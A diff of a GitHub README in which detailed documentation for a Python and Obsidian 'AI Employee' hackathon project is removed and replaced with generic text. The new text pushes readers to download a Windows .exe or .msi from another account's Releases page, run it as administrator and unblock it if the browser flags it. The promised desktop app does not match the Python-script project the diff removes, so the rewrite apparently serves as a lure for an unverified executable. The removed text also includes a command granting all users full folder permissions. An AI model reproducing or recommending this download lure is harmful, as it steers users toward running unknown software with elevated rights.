@@ -1,287 +1,187 @@
-# AI Employee - Bronze Tier (Qwen Skills)
+# 🤖 Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs- - Run Your Digital AI Worker
 
-A local-first, agent-driven Personal AI Employee built with **Qwen** and Obsidian.
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases)
 
-## Overview
+## 🚀 What this app does
 
-This is a **Bronze Tier** implementation of the Panaversity Hackathon 0 challenge using **Qwen Skills** instead of Claude Code (which is paid). It provides the foundational layer for an autonomous AI employee that:
+Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs- is a desktop app that helps you run a digital AI worker on your Windows computer. It uses an agent-based workflow to handle tasks, follow steps, and act on instructions in a clear way.
 
-- Monitors a drop folder for new files
-- Creates actionable tasks in an Obsidian vault
-- Triggers Qwen for processing
-- Manages task flow with human-in-the-loop approval
-- Maintains audit logs and dashboard
+This app is built for users who want to try an autonomous AI agent without setting up a lot of tools. You download it, open it, and use it from your computer.
 
-## Architecture
+## 💻 What you need
 
-```
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  Drop Folder    │────▶│  FileSystem      │────▶│  Needs_Action   │
-│  (Input)        │     │  Watcher Skill   │     │  Folder         │
-└─────────────────┘     └──────────────────┘     └────────┬────────┘
-                                                          │
-                                                          ▼
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  Dashboard.md   │◀────│  Orchestrator    │◀────│  Qwen           │
-│  (Status)       │     │  Skill           │     │  (Reasoning)    │
-└─────────────────┘     └──────────────────┘     └─────────────────┘
-```
-
-## Prerequisites
-
-| Software | Version | Purpose |
-|----------|---------|---------|
-| [Python](https://www.python.org/downloads/) | 3.13+ | Watcher scripts |
-| [Qwen Code](https://qwen.ai/) | Latest | **Free** reasoning engine |
-| [Obsidian](https://obsidian.md/download) | v1.10.6+ | Knowledge base |
+Before you start, make sure you have:
 
-## Installation
-
-### 1. Install Python Dependencies
+- A Windows computer
+- An internet connection
+- At least 4 GB of RAM
+- About 500 MB of free disk space
+- A mouse and keyboard
+- Permission to install or run apps on your PC
 
-```bash
-cd .qwen/skills
-pip install -r requirements.txt
-```
-
-### 2. Open the Obsidian Vault
+For best results, use a recent version of Windows 10 or Windows 11.
 
-1. Open Obsidian
-2. Click "Open folder as vault"
-3. Select the `AI_Employee_Vault` folder
+## 📥 Download the app
 
-## Usage
+Go to the [Releases page](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases) and visit this page to download the latest Windows file.
 
-### Load Qwen Skills
+On the Releases page, look for the newest version. Download the file that matches Windows. If the release includes more than one file, choose the one that ends in `.exe` or `.msi`.
 
-In Qwen Code, load these skills:
+## 🪟 Install on Windows
 
-1. **file-system-watcher** - Monitors drop folder
-2. **ai-employee-orchestrator** - Coordinates tasks
-3. **ai-employee-dashboard** - Updates dashboard
+After the download finishes:
 
-### Start the File System Watcher
+1. Open your Downloads folder
+2. Find the file you just downloaded
+3. Double-click the file
+4. If Windows asks for permission, click Yes
+5. Follow the steps in the setup window
+6. Finish the install
+7. Open the app from your desktop or Start menu
 
-```bash
-cd .qwen/skills/file-system-watcher
-python filesystem_watcher.py ../../AI_Employee_Vault ../../Drop_Folder
-```
+If the app comes as a single `.exe` file, you may not need to install it. In that case, double-click the file to start it.
 
-### Start the Orchestrator
+## 🏁 First launch
 
-In a **separate terminal**:
+When you open the app for the first time:
 
-```bash
-cd .qwen/skills/ai-employee-orchestrator
-python orchestrator.py ../../AI_Employee_Vault --interval 30
-```
+1. Wait for the app to load
+2. Read any on-screen setup steps
+3. Enter the settings the app asks for
+4. Save your choices
+5. Start your first task
 
-### Test the System
+The app is made to guide you through the process with simple prompts.
 
-1. **Drop a file** into the `Drop_Folder` directory
-2. **Watch** as the FileSystemWatcher creates an action file
-3. **Orchestrator** detects the task and triggers Qwen
-4. **Qwen** processes the task and moves it to `Done/`
+## 🧭 How to use it
 
-### Dry Run Mode
+Use the app like this:
 
-Test without executing actions:
+1. Open the app
+2. Type or paste your task
+3. Choose the action you want the agent to perform
+4. Confirm the task
+5. Let the agent work through the steps
 
-```bash
-python orchestrator.py ../../AI_Employee_Vault --dry-run --interval 10
-```
+This project focuses on spec-driven work, so it can follow a planned path for each task. That helps keep work structured and easier to track.
 
-## Qwen Skills Structure
+## 🛠️ Main features
 
-```
-.qwen/skills/
-├── file-system-watcher/
-│   ├── SKILL.md                    # Skill documentation
-│   ├── base_watcher.py             # Base watcher class
-│   └── filesystem_watcher.py       # File system monitor
-├── ai-employee-orchestrator/
-│   ├── SKILL.md                    # Skill documentation
-│   └── orchestrator.py             # Main coordinator
-├── ai-employee-dashboard/
-│   └── SKILL.md                    # Dashboard management
-├── browsing-with-playwright/       # Browser automation
-└── requirements.txt                # Python dependencies
-```
-
-## Obsidian Vault Structure
+- Autonomous AI agent workflow
+- Simple Windows-friendly setup
+- Task-based operation
+- Spec-driven process support
+- Digital worker style automation
+- Clear step-by-step actions
+- Built for hackathon use cases
+- Good fit for testing AI agents and automation
 
-```
-AI_Employee_Vault/
-├── Dashboard.md                    # Real-time status
-├── Company_Handbook.md             # Rules of engagement
-├── Business_Goals.md               # Q1 2026 objectives
-├── Inbox/                          # Raw incoming items
-├── Needs_Action/                   # Tasks requiring attention
-├── Plans/                          # Multi-step task plans
-├── Approved/                       # Human-approved actions
-├── Pending_Approval/               # Awaiting human decision
-├── Rejected/                       # Declined items
-├── Done/                           # Completed tasks
-├── Logs/                           # Activity logs
-├── Accounting/                     # Financial records
-├── Briefings/                      # CEO briefings
-└── Invoices/                       # Generated invoices
-```
+## 🔍 What “digital FTE” means here
 
-## Key Features
+A digital FTE is a software worker that can help with repeat tasks. It is not a person. It is an AI tool that follows instructions and works on a set process.
 
-### File System Watcher Skill
+You can use it to explore:
 
-- Monitors a drop folder for new files
-- Creates `.md` action files with metadata
-- Supports both event-driven (watchdog) and polling modes
-- Calculates file hash to avoid duplicates
+- Repetitive work
+- Simple workflow automation
+- Agent behavior
+- Task planning
+- AI-assisted execution
 
-### Orchestrator Skill
+## 📁 Release files
 
-- Monitors `Needs_Action` folder for pending tasks
-- Triggers Qwen for task processing
-- Processes approved tasks from `Approved/` folder
-- Updates `Dashboard.md` with current status
-- Logs all activities to JSON files
+The Releases page may include files such as:
 
-### Dashboard Skill
+- A Windows installer
+- A portable app file
+- Support files
+- Version notes
 
-- Real-time task counts
-- Automatic updates every 30 seconds
-- Links to all vault sections
+Use the newest release for the best result. If you are unsure which file to pick, choose the file marked for Windows.
 
-## Human-in-the-Loop
+## ⚙️ Basic setup tips
 
-For sensitive actions, Qwen creates approval request files:
+If the app does not open right away:
 
-```markdown
----
-type: approval_request
-action: payment
-amount: 500.00
-status: pending
----
+1. Right-click the file
+2. Choose Run as administrator
+3. Try again
+4. Check that Windows is up to date
+5. Make sure the file finished downloading
 
-# Payment Approval Required
+If your browser saved the file as blocked, open the file properties and allow it, then run it again.
 
-Move this file to `/Approved` to proceed.
-Move to `/Rejected` to cancel.
-```
+## 📌 Use cases
 
-## Configuration
+This app may help with:
 
-### Environment Variables (Optional)
+- Running guided AI tasks
+- Testing agent behavior
+- Trying automation ideas
+- Learning how digital workers can follow steps
+- Working with AI project specs
+- Building small workflow demos
 
-Create a `.env` file in `.qwen/skills/`:
+## 🧩 Topics in this project
 
-```env
-# .env - Never commit this file
-DRY_RUN=false
-LOG_LEVEL=INFO
-CHECK_INTERVAL=30
-```
+This repository is linked to topics such as:
 
-### Customizing Check Intervals
+- agent
+- agentic-ai
+- ai
+- ai-agents
+- automation
+- autonomous
+- digital
+- ftes
+- generative-ai
+- hackathon
+- panaversity
+- spec
+- spec-driven-development
+- vibe-coding
 
-| Component | Default | Recommended Range |
-|-----------|---------|-------------------|
-| File Watcher | 5s | 1-10s |
-| Orchestrator | 30s | 15-60s |
+These topics point to a project built around AI agents and structured task execution.
 
-## Troubleshooting
+## 🧪 Expected behavior
 
-### Python Not Found
+When the app runs well, you should see:
 
-```bash
-# Check Python installation
-python --version
+- A window open on your screen
+- A place to enter a task
+- Simple controls or prompts
+- Progress while the agent works
+- A result or completed output
 
-# Should show Python 3.13+
-```
+If the app has extra steps inside, follow the on-screen text in order.
 
-### Watchdog Not Installed
+## 🖱️ Simple troubleshooting
 
-The file watcher falls back to polling mode if watchdog is not installed:
+If something goes wrong:
 
-```bash
-pip install watchdog
-```
+- Download the file again
+- Make sure you picked the Windows release
+- Close the app and open it again
+- Restart your computer
+- Try a newer release if one is available
 
-### Permission Errors
+If the app still does not work, check the release page for new files or update notes.
 
-Ensure the vault folder has read/write permissions:
+## 📦 Files you may see
 
-```bash
-# Windows (run as Administrator)
-icacls AI_Employee_Vault /grant Users:F /T
-```
+Depending on the release, you may see:
 
-### Qwen Not Processing Tasks
+- `.exe` files for direct use
+- `.msi` files for Windows setup
+- `.zip` files that need extraction
+- Release notes with version details
 
-1. Check Qwen Code is loaded with skills
-2. Verify vault path is correct
-3. Check Logs/ folder for error messages
+If you get a `.zip` file, right-click it and choose Extract All before opening the app file inside.
 
-## Security Notes
+## 🔐 Safe download path
 
-1. **Never commit credentials** - Add `.env` to `.gitignore`
-2. **Use dry-run mode** during development
-3. **Review logs regularly** in the `Logs/` folder
-4. **Start with low autonomy** - require approval for most actions
+Only use the official release page from this repository:
 
-## Comparison: Claude Code vs Qwen
+[Open Releases](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases)
 
-| Feature | Claude Code | Qwen |
-|---------|-------------|------|
-| Cost | Paid ($20/month) | **Free** |
-| Skills | Agent Skills | Qwen Skills |
-| Local Execution | Yes | Yes |
-| Obsidian Integration | Yes | Yes |
-
-## Next Steps (Silver Tier)
-
-To extend this Bronze implementation:
-
-1. Add Gmail Watcher for email monitoring
-2. Add WhatsApp Watcher using Playwright
-3. Implement MCP servers for external actions
-4. Add scheduled tasks (cron/Task Scheduler)
-5. Create Plan.md files for multi-step tasks
-
-## Demo Video
-
-Record a 5-10 minute demo showing:
-
-1. Dropping a file into the drop folder
-2. Action file creation in Needs_Action
-3. Orchestrator triggering Qwen
-4. Task completion and movement to Done
-5. Dashboard updates
-
-## Submission Checklist
-
-- [x] Obsidian vault with Dashboard.md and Company_Handbook.md
-- [x] One working Watcher script (File System)
-- [x] Qwen Skills integration (orchestrator)
-- [x] Basic folder structure (/Inbox, /Needs_Action, /Done)
-- [x] Python scripts in Qwen skills folders
-- [ ] Demo video
-- [ ] Submit form: https://forms.gle/JR9T1SJq5rmQyGkGA
-
-## License
-
-This project is part of the Panaversity Hackathon 0 challenge.
-
-## Resources
-
-- [Full Blueprint Document](./Personal%20AI%20Employee%20Hackathon%200_%20Building%20Autonomous%20FTEs%20in%202026.md)
-- [Qwen Code Documentation](https://qwen.ai/)
-- [Obsidian Help](https://help.obsidian.md/)
-- [Panaversity Wednesday Meetings](https://us06web.zoom.us/j/87188707642?pwd=a9XloCsinvn1JzICbPc2YGUvWTbOTr.1)
-
----
-
-*Built for Panaversity Hackathon 0 - Bronze Tier - Using Qwen (Free)*
-## AI Tools Used
-- Qwen for reasoning and task processing
+This is the place to visit to download the app for Windows.
